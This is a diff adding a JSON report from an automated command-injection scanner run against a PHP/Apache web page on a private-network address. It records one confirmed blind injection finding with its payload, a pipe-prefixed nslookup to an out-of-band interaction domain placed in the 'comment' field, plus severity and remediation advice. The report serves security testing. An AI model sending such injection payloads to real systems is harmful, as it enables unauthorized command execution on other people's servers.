@@ -1,0 +1,32 @@
+{
+  "scan_summary": {
+    "target_url": "http://192.168.1.15:8088/blind/",
+    "scan_start_time": "2025-08-16T12:57:32+07:00",
+    "scan_end_time": "2025-08-16T13:01:09+07:00",
+    "total_duration": "3m36s",
+    "scanners_run": [
+      "cmdinjection"
+    ],
+    "technologies_detected": {
+      "WebServer": "Apache/2.4.62 (Debian)",
+      "X-Powered-By": "PHP/8.2.29"
+    },
+    "total_urls_discovered": 1,
+    "total_parameterized_requests": 0,
+    "total_vulnerabilities_found": 1
+  },
+  "vulnerabilities": [
+    {
+      "VulnerabilityType": "Blind Command Injection (OAST: OAST via nslookup)",
+      "URL": "http://192.168.1.15:8088/blind/",
+      "Parameter": "comment",
+      "Payload": "| nslookup cmd-comment-298835935.d2g1rj0lubkqbgsbj6c0ecqk9nerj6nxt.oast.me",
+      "Location": "body",
+      "Details": " Confirmed via dns interaction from 118.98.115.42.",
+      "severity": "high",
+      "evidence": "Payload sent to cmd-comment-298835935.d2g1rj0lubkqbgsbj6c0ecqk9nerj6nxt.oast.me",
+      "remediation": "Avoid using untrusted input in OS commands. Use whitelisting and secure APIs.",
+      "scanner_name": "Context-Aware Command Injection Scanner"
+    }
+  ]
+}
